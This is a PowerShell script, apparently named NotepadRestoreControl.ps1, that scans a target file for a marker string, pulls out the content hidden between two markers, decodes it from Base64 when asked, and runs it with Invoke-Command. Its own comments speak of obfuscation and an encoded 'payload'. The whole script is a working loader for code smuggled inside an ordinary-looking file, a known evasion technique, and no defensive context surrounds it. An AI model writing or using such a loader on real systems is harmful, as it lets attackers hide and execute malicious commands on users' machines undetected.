param (
    [string]$SetString,     # Marker string used in obfuscation
    [string]$TargetFile,    # File to extract obfuscated script from
    [switch]$CmdExecution,  # Switch to trigger command execution
    [switch]$UnicodeBase64, # Switch to trigger command execution from UTF-16LE Base64 encoding
    [switch]$RegularBase64, # Switch to trigger command execution from UTF-8 Base64 encoding
    [switch]$CmdDisplay     # extract and display the command in the terminal 
)

# Function to convert marker string to UTF-16LE byte array
function Get-HexByteArray {
    param ([string]$inputString)

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($inputString)
    return $bytes
}

# Function to extract and execute content between two marker strings
function Invoke-CmdExecution {
    # Convert marker string to byte array
    $markerBytes = Get-HexByteArray -inputString $SetString

    # Read the file as bytes
    $bytes = [System.IO.File]::ReadAllBytes($TargetFile)

    # Find the first occurrence of the marker
    $startIndex = -1
    for ($i = 0; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
        $match = $true
        for ($j = 0; $j -lt $markerBytes.Length; $j++) {
            if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                $match = $false
                break
            }
        }
        if ($match) {
            $startIndex = $i + $markerBytes.Length
            break
        }
    }

    # Find the second occurrence of the marker
    $endIndex = -1
    if ($startIndex -ne -1) {
        for ($i = $startIndex; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
            $match = $true
            for ($j = 0; $j -lt $markerBytes.Length; $j++) {
                if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                    $match = $false
                    break
                }
            }
            if ($match) {
                $endIndex = $i
                break
            }
        }
    }

    # Extract and execute the content
    if ($startIndex -ne -1 -and $endIndex -ne -1) {
        $contentBytes = $bytes[$startIndex..($endIndex - 1)]
        $extractedContent = [System.Text.Encoding]::Unicode.GetString($contentBytes)

        Write-Host "Executing extracted PowerShell command..."
        $scriptBlock = [ScriptBlock]::Create($extractedContent)
        Invoke-Command -ScriptBlock $scriptBlock
    } else {
        Write-Host "Could not find both SetString markers."
    }
}

function Invoke-UnicodeBase64CmdExecution {
    # Convert marker string to byte array
    $markerBytes = Get-HexByteArray -inputString $SetString

    # Read the file as bytes
    $bytes = [System.IO.File]::ReadAllBytes($TargetFile)

    # Find the first occurrence of the marker
    $startIndex = -1
    for ($i = 0; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
        $match = $true
        for ($j = 0; $j -lt $markerBytes.Length; $j++) {
            if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                $match = $false
                break
            }
        }
        if ($match) {
            $startIndex = $i + $markerBytes.Length
            break
        }
    }

    # Find the second occurrence of the marker
    $endIndex = -1
    if ($startIndex -ne -1) {
        for ($i = $startIndex; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
            $match = $true
            for ($j = 0; $j -lt $markerBytes.Length; $j++) {
                if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                    $match = $false
                    break
                }
            }
            if ($match) {
                $endIndex = $i
                break
            }
        }
    }

    # Extract and decode the Base64 content
    if ($startIndex -ne -1 -and $endIndex -ne -1) {
        $contentBytes = $bytes[$startIndex..($endIndex - 1)]
        $base64String = [System.Text.Encoding]::Unicode.GetString($contentBytes)

        try {
            $decodedBytes = [System.Convert]::FromBase64String($base64String)
            $decodedContent = [System.Text.Encoding]::Unicode.GetString($decodedBytes)

            Write-Host "Executing decoded PowerShell command..."
            $scriptBlock = [ScriptBlock]::Create($decodedContent)
            Invoke-Command -ScriptBlock $scriptBlock
        } catch {
            Write-Host "Failed to decode or execute Base64 content: $_"
        }
    } else {
        Write-Host "Could not find both SetString markers."
    }
}

function Invoke-RegularBase64CmdExecution {
    # Convert marker string to byte array
    $markerBytes = Get-HexByteArray -inputString $SetString

    # Read the file as bytes
    $bytes = [System.IO.File]::ReadAllBytes($TargetFile)

    # Find the first occurrence of the marker
    $startIndex = -1
    for ($i = 0; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
        $match = $true
        for ($j = 0; $j -lt $markerBytes.Length; $j++) {
            if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                $match = $false
                break
            }
        }
        if ($match) {
            $startIndex = $i + $markerBytes.Length
            break
        }
    }

    # Find the second occurrence of the marker
    $endIndex = -1
    if ($startIndex -ne -1) {
        for ($i = $startIndex; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
            $match = $true
            for ($j = 0; $j -lt $markerBytes.Length; $j++) {
                if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                    $match = $false
                    break
                }
            }
            if ($match) {
                $endIndex = $i
                break
            }
        }
    }

    # Extract and decode the Base64 content
    if ($startIndex -ne -1 -and $endIndex -ne -1) {
        $contentBytes = $bytes[$startIndex..($endIndex - 1)]
        $base64String = [System.Text.Encoding]::Unicode.GetString($contentBytes)

        try {
            $decodedBytes = [System.Convert]::FromBase64String($base64String)
            $decodedContent = [System.Text.Encoding]::ASCII.GetString($decodedBytes)

            Write-Host "Executing decoded PowerShell command..."
            $scriptBlock = [ScriptBlock]::Create($decodedContent)
            Invoke-Command -ScriptBlock $scriptBlock
        } catch {
            Write-Host "Failed to decode or execute Base64 content: $_"
        }
    } else {
        Write-Host "Could not find both SetString markers."
    }
}

function Invoke-CmdDisplay {
    # Convert marker string to byte array
    $markerBytes = Get-HexByteArray -inputString $SetString

    # Read the file as bytes
    $bytes = [System.IO.File]::ReadAllBytes($TargetFile)

    # Find the first occurrence of the marker
    $startIndex = -1
    for ($i = 0; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
        $match = $true
        for ($j = 0; $j -lt $markerBytes.Length; $j++) {
            if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                $match = $false
                break
            }
        }
        if ($match) {
            $startIndex = $i + $markerBytes.Length
            break
        }
    }

    # Find the second occurrence of the marker
    $endIndex = -1
    if ($startIndex -ne -1) {
        for ($i = $startIndex; $i -le ($bytes.Length - $markerBytes.Length); $i++) {
            $match = $true
            for ($j = 0; $j -lt $markerBytes.Length; $j++) {
                if ($bytes[$i + $j] -ne $markerBytes[$j]) {
                    $match = $false
                    break
                }
            }
            if ($match) {
                $endIndex = $i
                break
            }
        }
    }

    # Extract and execute the content
    if ($startIndex -ne -1 -and $endIndex -ne -1) {
        $contentBytes = $bytes[$startIndex..($endIndex - 1)]
        $extractedContent = [System.Text.Encoding]::Unicode.GetString($contentBytes)

        Write-Host "Displaying extracted PowerShell command..."
        $scriptBlock = [ScriptBlock]::Create($extractedContent)
        Write-Output $scriptBlock
    } else {
        Write-Host "Could not find both SetString markers."
    }
}


# Execute if switch is used
if ($CmdExecution)  {Invoke-CmdExecution}
if ($UnicodeBase64) {Invoke-UnicodeBase64CmdExecution}
if ($RegularBase64) {Invoke-RegularBase64CmdExecution}
if ($CmdDisplay)    {Invoke-CmdDisplay}

# Show help if no arguments are provided
if (-not ($SetString -or $TargetFile -or $CmdExecution -or $UnicodeBase64 -or $RegularBase64)) {
    Write-Output @"
Usage: .\NotepadRestoreControl.ps1 [-SetString] [-TargetFile] [-CmdExecution]

    -SetString       : Common string used in the obfuscation process
    -TargetFile      : Target file to extract and execute content from
    -CmdExecution    : Execute the extracted PowerShell command
    -UnicodeBase64   : Unicode Base64 encoded payload file UTF-16LE (powershell)
    -RegularBase64   : Regular Base64 encoded payload file UTF-8 (cyberchef)
    -CmdDisplay      : Extarct and display command in the terminal from target file 
"@
}
